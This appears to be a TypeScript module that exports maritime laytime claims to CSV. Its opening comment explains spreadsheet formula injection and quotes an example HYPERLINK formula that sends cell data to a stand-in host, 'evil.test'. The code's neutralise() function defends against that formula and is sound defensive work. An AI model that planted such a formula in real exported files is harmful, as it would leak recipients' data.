// CSV export: the format maritime operators actually work in.
//
// Pure — no I/O, no Supabase. The route hands it already-loaded rows and gets a
// string back, so every escaping rule below is unit-testable against a literal.
//
// THE THREAT MODEL IS NOT WHAT PEOPLE EXPECT FROM AN EXPORT.
//
// A laytime CSV is opened in Excel, almost without exception, and roughly half
// its content is text this system did not author: `raw_text` is a line lifted
// verbatim out of a counterparty's Statement of Facts by a vision model, and
// `reasoning`/`clause_ref` are engine output that quotes it. Excel treats a cell
// beginning `=`, `+`, `-` or `@` as a FORMULA, so a PDF containing a line like
//
//     =HYPERLINK("https://evil.test?d="&A1,"Loading commenced")
//
// becomes a live exfiltration link in the recipient's spreadsheet — and the
// recipient here is a charterer's claims department, opening an attachment they
// were expecting from a counterparty they are in dispute with. `neutralise()`
// below is the defence, and it is the reason this module exists as its own
// tested unit rather than as a `.map().join(",")` inside a route handler.

/** RFC 4180 line ending. Excel is the target and it wants CRLF. */
const CRLF = "\r\n";

/**
 * UTF-8 BOM.
 *
 * Excel on Windows reads a BOM-less UTF-8 CSV as the system's legacy code page,
 * so vessel names and ports with any non-ASCII character — "Ust-Luga",
 * "Gdańsk", a Greek owner's name — arrive mojibaked. The BOM is three bytes
 * that make the file open correctly for the people who will actually open it.
 *
 * It is deliberately NOT part of `toCsv()`: the BOM belongs to the FILE, not to
 * the format, and a test asserting on CSV content should not have to strip it.
 * The route adds it via `csvFileBody()`.
 */
export const UTF8_BOM = "﻿";

/**
 * Characters that make Excel/Sheets/LibreOffice treat a cell as a formula.
 *
 * Tab and carriage return are in the list because both are stripped during
 * paste, which can promote the NEXT character into leading position — a cell
 * starting "\t=cmd" is `=cmd` once Excel has finished with it.
 */
const FORMULA_LEADERS = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Neutralises a value that would otherwise execute in a spreadsheet.
 *
 * Prefixes a single quote, which every major spreadsheet reads as "the rest of
 * this cell is literal text" and does not display. Chosen over stripping the
 * character because these are EVIDENCE fields: a Statement of Facts line
 * reading "-1200 MT shortfall" must survive export intact, and silently
 * deleting the minus sign would corrupt a figure in a document somebody may
 * later rely on in arbitration.
 *
 * Applied before quoting, so the quote character itself is escaped normally.
 */
export function neutralise(value: string): string {
  if (value.length === 0) return value;
  return FORMULA_LEADERS.includes(value[0]) ? `'${value}` : value;
}

/**
 * One CSV field, per RFC 4180.
 *
 * Quotes when the value contains a comma, a quote or a newline; doubles any
 * embedded quote. Numbers are emitted unquoted so they arrive as numbers rather
 * than as text a recipient has to convert before summing a column.
 */
export function csvField(value: unknown): string {
  if (value === null || value === undefined) return "";

  if (typeof value === "number") {
    // NaN/Infinity would land in a spreadsheet as the literal text "NaN",
    // which reads as a data-entry error rather than as a missing value.
    return Number.isFinite(value) ? String(value) : "";
  }
  if (typeof value === "boolean") return value ? "TRUE" : "FALSE";

  const text = neutralise(String(value));
  if (/[",\r\n]/.test(text)) {
    return `"${text.replace(/"/g, '""')}"`;
  }
  return text;
}

export function csvRow(cells: readonly unknown[]): string {
  return cells.map(csvField).join(",");
}

/** A header row plus body rows, CRLF-joined with a trailing terminator. */
export function toCsv(header: readonly string[], rows: readonly (readonly unknown[])[]): string {
  return [csvRow(header), ...rows.map(csvRow)].join(CRLF) + CRLF;
}

/** What actually gets written to a file or sent as a download. */
export function csvFileBody(csv: string): string {
  return UTF8_BOM + csv;
}

/**
 * A filename safe on every platform the recipient might be on.
 *
 * Vessel names contain slashes ("M/V ARTEMIS") often enough that this matters:
 * a slash in a Content-Disposition filename truncates the name at best and is
 * rejected at worst.
 */
export function csvFilename(parts: Array<string | null | undefined>, suffix: string): string {
  const stem =
    parts
      .filter((p): p is string => Boolean(p && p.trim()))
      .join("-")
      .replace(/[^\w\-. ]+/g, "-")
      .replace(/\s+/g, "-")
      .replace(/-+/g, "-")
      .replace(/^-|-$/g, "")
      .slice(0, 80) || "claim";
  return `${stem}-${suffix}.csv`;
}

// ── The two exports a laytime claim actually needs ─────────────────────────

export interface CsvEvent {
  occurredAt: string;
  eventType: string;
  rawText?: string | null;
  source?: string | null;
  status?: string | null;
}

export interface CsvBreakdownRow {
  start_time: string;
  end_time: string;
  duration_hours: number;
  status: string;
  counts: boolean;
  clause_ref: string;
  reasoning: string;
}

export interface CsvTotals {
  allowed_hours: number;
  used_hours: number;
  time_on_demurrage_hours: number;
  time_saved_hours: number;
  demurrage_half_rate_hours?: number;
  demurrage_amount: number;
  despatch_amount: number;
  currency: string;
}

export interface CsvClaimHeader {
  vessel: string;
  voyageRef: string;
  port: string;
  cargo: string;
  cpForm?: string | null;
  engineVersion?: number | null;
  conformanceRoot?: string | null;
  generatedAt: string;
}

/**
 * The Statement of Facts timeline.
 *
 * Timestamps are emitted as full ISO-8601 WITH the offset, never as a
 * spreadsheet date. Excel silently reinterprets anything it recognises as a
 * date in the opening machine's locale and timezone — so `04/03/2024` becomes
 * April 3rd for an American recipient and March 4th for a European one, and a
 * laytime dispute is decided by exactly that kind of difference. Text that
 * cannot be misread beats a cell that sorts nicely.
 */
export function eventsToCsv(events: readonly CsvEvent[]): string {
  return toCsv(
    ["occurred_at_utc", "event_type", "source", "status", "raw_text"],
    events.map((e) => [e.occurredAt, e.eventType, e.source ?? "", e.status ?? "", e.rawText ?? ""])
  );
}

/** The hour-by-hour laytime breakdown, one row per interval. */
export function breakdownToCsv(rows: readonly CsvBreakdownRow[]): string {
  return toCsv(
    [
      "start_time_utc",
      "end_time_utc",
      "duration_hours",
      "status",
      "counts_against_laytime",
      "clause_ref",
      "reasoning",
    ],
    rows.map((r) => [
      r.start_time,
      r.end_time,
      r.duration_hours,
      r.status,
      r.counts,
      r.clause_ref,
      r.reasoning,
    ])
  );
}

/**
 * The whole claim as one file: provenance header, totals, breakdown, timeline.
 *
 * Sections are separated by a blank line inside a single CSV, which every
 * spreadsheet opens without complaint, rather than as a zip of three files that
 * the recipient has to unpack. The header block carries the engine version and
 * conformance root, so a figure exported today can be tied back to the exact
 * rule set that produced it — the same reason those appear in the shared view.
 */
export function claimToCsv(params: {
  header: CsvClaimHeader;
  totals: CsvTotals | null;
  breakdown: readonly CsvBreakdownRow[];
  events: readonly CsvEvent[];
}): string {
  const { header, totals, breakdown, events } = params;

  const meta: Array<readonly unknown[]> = [
    ["Vessel", header.vessel],
    ["Voyage reference", header.voyageRef],
    ["Port", header.port],
    ["Cargo", header.cargo],
    ["Charterparty form", header.cpForm ?? ""],
    ["Engine rule set", header.engineVersion ?? ""],
    // The engine fingerprint travels with the numbers. A breakdown without it
    // is a figure with no way to establish which rules produced it.
    ["Engine conformance root", header.conformanceRoot ?? ""],
    ["Generated at (UTC)", header.generatedAt],
  ];

  const totalsRows: Array<readonly unknown[]> = totals
    ? [
        ["Allowed hours", totals.allowed_hours],
        ["Used hours", totals.used_hours],
        ["Time on demurrage (hours)", totals.time_on_demurrage_hours],
        ["Time saved (hours)", totals.time_saved_hours],
        ...(totals.demurrage_half_rate_hours !== undefined
          ? [["Demurrage at half rate (hours)", totals.demurrage_half_rate_hours] as const]
          : []),
        ["Demurrage amount", totals.demurrage_amount],
        ["Despatch amount", totals.despatch_amount],
        ["Currency", totals.currency],
      ]
    : [["Totals", "No calculation has been run for this claim"]];

  return [
    toCsv(["Laytime statement", ""], meta),
    "",
    toCsv(["Totals", ""], totalsRows),
    "",
    breakdown.length > 0
      ? breakdownToCsv(breakdown)
      : toCsv(["Breakdown"], [["No breakdown available"]]),
    "",
    eventsToCsv(events),
  ].join(CRLF);
}
